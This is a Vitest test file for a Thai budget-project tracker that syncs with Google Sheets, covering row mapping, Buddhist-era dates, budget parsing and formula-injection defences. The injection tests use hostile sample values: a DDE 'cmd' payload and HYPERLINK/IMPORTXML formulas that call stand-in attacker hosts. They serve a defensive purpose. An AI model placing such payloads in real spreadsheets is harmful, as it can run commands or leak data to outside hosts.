import { describe, it, expect } from 'vitest';
import {
  mapRowToProject,
  mapProjectToRow,
  areProjectsDifferent,
  normalizeBudget,
  parseMeetingNo,
  sanitizeForSheetFormula,
  unescapeSheetFormula,
} from '../utils/googleSheets';
import {
  formatCurrency,
  formatMillionBaht,
  getStatusLabel,
  getDisbursementStatusLabel,
  calculateDisbursementRate,
  getInvestmentStageLabel,
} from '../utils/formatters';
import {
  parseThaiOrIsoDate,
  isGregorianLeapYear,
  isBuddhistLeapYear,
  toSafeJsDate,
} from '../utils/dateUtils';
import { ProjectItem } from '../types';
import { DEFAULT_STATUSES, DEPARTMENTS } from '../data/projectsData';

describe('1. Unit & Integration Tests: Google Sheets Mapping & Calculations', () => {
  it('correctly parses a standard 22-column row into a ProjectItem', () => {
    const row = [
      '1', // 0: id
      '4/2567', // 1: meetingNo
      'approved', // 2: statusCategory
      'DT01', // 3: departmentCode
      'โครงการพัฒนาระบบ AI', // 4: title
      'งบดำเนินงาน/งบลงทุน', // 5: expenseType
      '1,000,000', // 6: requestedBudget
      '950,000', // 7: approvedBudget
      '500,000', // 8: operatingBudget
      '450,000', // 9: investmentBudget
      '950,000', // 10: totalApprovedBudget
      '500,000', // 11: disbursedOperating
      '450,000', // 12: disbursedInvestment
      'อนุมัติแล้ว', // 13: statusLabel
      'ลงนามสัญญาแล้ว', // 14: stageLabel
      '01/05/2567', // 15: contractDate
      '31/12/2567', // 16: projectDeadline
      'ไม่มีข้อสังเกต', // 17: remarks
      '15/04/2567', // 18: ministerSignedDate
      '20/04/2567', // 19: bbApprovedDate
      '2026-08-30T10:00:00.000Z', // 20: updatedAt
      'Admin Test', // 21: lastModifiedBy
    ];

    const project = mapRowToProject(row, null);

    expect(project.id).toBe(1);
    expect(project.meetingNo).toBe('4/2567');
    expect(project.departmentCode).toBe('DT01');
    expect(project.title).toBe('โครงการพัฒนาระบบ AI');
    expect(project.requestedBudget).toBe(1000000);
    expect(project.approvedBudget).toBe(950000);
    expect(project.operatingBudget).toBe(500000);
    expect(project.investmentBudget).toBe(450000);
    expect(project.disbursedAmount).toBe(950000);
    expect(project.statusCategory).toBe('approved');
    expect(project.ministerSignedDate).toBe('15/04/2567');
    expect(project.bbApprovedDate).toBe('20/04/2567');
    expect(project.contractDate).toBe('01/05/2567');
    expect(project.projectDeadline).toBe('31/12/2567');
    expect(project.remarks).toBe('ไม่มีข้อสังเกต');
  });

  it('correctly parses meeting number with Thai variations (เช่น "ครั้งที่ 1/2567" -> "1/2567")', () => {
    expect(parseMeetingNo('ครั้งที่ 1/2567')).toBe('1/2567');
    expect(parseMeetingNo('  3/2568  ')).toBe('3/2568');
    expect(parseMeetingNo('')).toBe('1/2569');
    expect(parseMeetingNo('ไม่ได้จัดประชุม')).toBe('ไม่ได้จัดประชุม');
  });

  it('correctly detects changes between two project arrays in areProjectsDifferent', () => {
    const listA: ProjectItem[] = [
      {
        id: 1,
        meetingNo: '1/2567',
        departmentCode: 'DEP1',
        departmentName: 'Dept 1',
        title: 'Project 1',
        requestedBudget: 100000,
        approvedBudget: 100000,
        operatingBudget: 50000,
        investmentBudget: 50000,
        disbursedAmount: 0,
        statusCategory: 'approved',
        approvedStatusText: 'อนุมัติแล้ว',
        investmentStage: 'ยังไม่ได้ดำเนินการ',
        contractDate: null,
        projectDeadline: null,
        remarks: '',
        ministerSignedDate: null,
        bbApprovedDate: null,
        updatedAt: '2026-08-30T00:00:00.000Z',
      },
    ];

    const listB = JSON.parse(JSON.stringify(listA));
    expect(areProjectsDifferent(listA, listB)).toBe(false);

    // Modify a date
    listB[0].ministerSignedDate = '01/01/2568';
    expect(areProjectsDifferent(listA, listB)).toBe(true);

    // Modify a disbursement value
    const listC = JSON.parse(JSON.stringify(listA));
    listC[0].disbursedAmount = 25000;
    expect(areProjectsDifferent(listA, listC)).toBe(true);
  });
});

describe('2. Security & CSV / Formula Injection Tests', () => {
  it('escapes dangerous formula triggers (=, +, -, @, tab) with a single quote prefix', () => {
    expect(sanitizeForSheetFormula('=HYPERLINK("http://attacker.com", "Click")')).toBe('\'=HYPERLINK("http://attacker.com", "Click")');
    expect(sanitizeForSheetFormula('+cmd|"/C calc"!A0')).toBe('\'+cmd|"/C calc"!A0');
    expect(sanitizeForSheetFormula('-2+3+cmd')).toBe('\'-2+3+cmd');
    expect(sanitizeForSheetFormula('@SUM(1,2)')).toBe('\'@SUM(1,2)');
    expect(sanitizeForSheetFormula('โครงการปกติ')).toBe('โครงการปกติ');
  });

  it('safely unescapes escaped formula strings when read back from Google Sheet', () => {
    expect(unescapeSheetFormula('\'=HYPERLINK("http://test.com", "Test")')).toBe('=HYPERLINK("http://test.com", "Test")');
    expect(unescapeSheetFormula('\'@SUM(1,2)')).toBe('@SUM(1,2)');
    expect(unescapeSheetFormula('ข้อความปกติ')).toBe('ข้อความปกติ');
  });

  it('protects project rows generated by mapProjectToRow from formula execution', () => {
    const maliciousProject: ProjectItem = {
      id: 99,
      meetingNo: '=1/2569',
      departmentCode: '+DEP',
      departmentName: 'Dept',
      title: '=IMPORTXML("http://attacker.com/malicious.xml", "//payload")',
      requestedBudget: 500000,
      approvedBudget: null,
      approvedStatusText: '-',
      ministerSignedDate: '@15/04/2567',
      bbApprovedDate: '-20/04/2567',
      statusCategory: 'draft_pending',
      remarks: '=HYPERLINK("http://phishing.site")',
    };

    const row = mapProjectToRow(maliciousProject, 0);
    // Index 1: meetingNo, 3: dept, 4: title, 17: remarks, 18: ministerSignedDate, 19: bbApprovedDate
    expect(row[1]).toBe('\'=1/2569');
    expect(row[3]).toBe('\'+DEP');
    expect(row[4]).toBe('\'=IMPORTXML("http://attacker.com/malicious.xml", "//payload")');
    expect(row[17]).toBe('\'=HYPERLINK("http://phishing.site")');
    expect(row[18]).toBe('\'@15/04/2567');
    expect(row[19]).toBe('\'-20/04/2567');
  });
});

describe('3. Thai Era (พ.ศ.) vs Common Era (ค.ศ.), Leap Year & Date Ambiguity Tests', () => {
  it('correctly identifies leap years for both CE and BE (e.g. 2024 / 2567 is leap year, 2023 / 2566 is not)', () => {
    expect(isGregorianLeapYear(2024)).toBe(true);
    expect(isGregorianLeapYear(2023)).toBe(false);
    expect(isGregorianLeapYear(2000)).toBe(true);
    expect(isGregorianLeapYear(1900)).toBe(false);

    expect(isBuddhistLeapYear(2567)).toBe(true); // 2567 - 543 = 2024 (Leap)
    expect(isBuddhistLeapYear(2568)).toBe(false); // 2568 - 543 = 2025 (Not leap)
  });

  it('safely parses 29 กุมภาพันธ์ 2567 (29/02/2567) into 2024-02-29 without invalid date corruption', () => {
    const leapDateBE = parseThaiOrIsoDate('29/02/2567');
    expect(leapDateBE).not.toBeNull();
    expect(leapDateBE?.day).toBe(29);
    expect(leapDateBE?.month).toBe(2);
    expect(leapDateBE?.yearBE).toBe(2567);
    expect(leapDateBE?.yearCE).toBe(2024);
    expect(leapDateBE?.formattedISO).toBe('2024-02-29');
    expect(leapDateBE?.formattedBE).toBe('29/02/2567');

    const jsDate = toSafeJsDate('29/02/2567');
    expect(jsDate).not.toBeNull();
    expect(jsDate?.getFullYear()).toBe(2024);
    expect(jsDate?.getMonth()).toBe(1); // 0-indexed month (1 = February)
    expect(jsDate?.getDate()).toBe(29);
  });

  it('rejects invalid leap dates like 29/02/2568 (2568 is not a leap year)', () => {
    const nonLeapDate = parseThaiOrIsoDate('29/02/2568');
    expect(nonLeapDate).toBeNull();
  });

  it('resolves date ambiguities in Thai DD/MM/YYYY vs ISO YYYY-MM-DD', () => {
    // 05/06/2569 (Thai format: 5 June 2569)
    const dmyThai = parseThaiOrIsoDate('05/06/2569');
    expect(dmyThai?.day).toBe(5);
    expect(dmyThai?.month).toBe(6);
    expect(dmyThai?.yearBE).toBe(2569);
    expect(dmyThai?.yearCE).toBe(2026);

    // 2026-05-06 (ISO format: 6 May 2026)
    const isoDate = parseThaiOrIsoDate('2026-05-06');
    expect(isoDate?.day).toBe(6);
    expect(isoDate?.month).toBe(5);
    expect(isoDate?.yearCE).toBe(2026);
    expect(isoDate?.yearBE).toBe(2569);
  });
});

describe('4. Edge Cases Simulation & Boundary Testing', () => {
  it('handles empty strings, dashes ("-"), and "null" as null dates rather than literal strings', () => {
    const row = [
      '3', // 0: id
      '2/2567', // 1: meetingNo
      'approved', // 2: statusCategory
      'DEP', // 3: departmentCode
      'Test Edge Case Nulls', // 4: title
      'งบดำเนินงาน', // 5: expenseType
      '100000', // 6: requestedBudget
      '100000', // 7: approvedBudget
      '50000', // 8: operatingBudget
      '50000', // 9: investmentBudget
      '100000', // 10: totalApprovedBudget
      '0', // 11: disbursedOperating
      '0', // 12: disbursedInvestment
      'อนุมัติแล้ว', // 13: statusLabel
      'กำลังดำเนินการ', // 14: stageLabel
      '-', // 15: contractDate
      'null', // 16: projectDeadline
      '', // 17: remarks
      '-', // 18: ministerSignedDate
      'null', // 19: bbApprovedDate
      '', // 20: updatedAt
      '', // 21: lastModifiedBy
    ];

    const project = mapRowToProject(row, null);
    expect(project.contractDate).toBe(null);
    expect(project.projectDeadline).toBe(null);
    expect(project.ministerSignedDate).toBe(null);
    expect(project.bbApprovedDate).toBe(null);
    expect(project.remarks).toBe('');
  });

  it('handles malformed numeric values (commas, currency symbols, NaN strings)', () => {
    expect(normalizeBudget('฿ 1,234,567.89')).toBe(1234567.89);
    expect(normalizeBudget('  -  ')).toBe(0);
    expect(normalizeBudget('N/A')).toBe(0);
    expect(normalizeBudget(undefined)).toBe(0);
    expect(normalizeBudget(null)).toBe(0);
    expect(normalizeBudget(-5000)).toBe(-5000);
    expect(normalizeBudget('95.5%')).toBe(95.5);
  });

  it('handles division by zero and extreme numbers in KPI calculations gracefully', () => {
    expect(calculateDisbursementRate(0, 0)).toBe(0);
    expect(calculateDisbursementRate(100, 0)).toBe(0);
    expect(calculateDisbursementRate(null, undefined)).toBe(0);
    expect(calculateDisbursementRate(50000, 100000)).toBe(50);
  });

  it('handles disbursement exceeding approved budget without crashing calculation', () => {
    const approved = 100000;
    const disbursed = 120000;
    const remaining = approved - disbursed;
    const percentage = approved > 0 ? (disbursed / approved) * 100 : 0;

    expect(remaining).toBe(-20000);
    expect(percentage).toBe(120);
  });

  it('formats large numbers into Thai currency format correctly', () => {
    expect(formatCurrency(1500000, true)).toBe('1.50 ล้านบาท');
    expect(formatMillionBaht(2500000)).toBe('2.50 ลบ.');
    expect(formatCurrency(null)).toBe('-');
  });
});

describe('5. Code Quality & Security Audit Verifications', () => {
  it('ensures all department codes in DEPARTMENTS have valid fullName and color codes', () => {
    Object.entries(DEPARTMENTS).forEach(([code, dept]) => {
      expect(dept.fullName).toBeDefined();
      expect(dept.fullName.length).toBeGreaterThan(0);
      expect(dept.code).toBe(code);
      expect(dept.color).toBeDefined();
    });
  });

  it('ensures default statuses contain required core category transitions', () => {
    const categories = DEFAULT_STATUSES.map((s) => s.key);
    expect(categories).toContain('draft_pending');
    expect(categories).toContain('under_review');
    expect(categories).toContain('approved');
    expect(categories).toContain('signed_pending');
    expect(categories).toContain('returned_review');
  });

  it('correctly maps status and stage labels without crashing', () => {
    expect(getStatusLabel('approved')).toBe('สงป. อนุมัติแล้ว');
    expect(getStatusLabel('under_review')).toBe('อยู่ระหว่างพิจารณา (สงป.)');
    expect(getDisbursementStatusLabel('completed')).toBe('เบิกจ่ายครบ 100%');
    expect(getInvestmentStageLabel('procuring')).toBe('หาผู้รับจ้าง');
  });
});
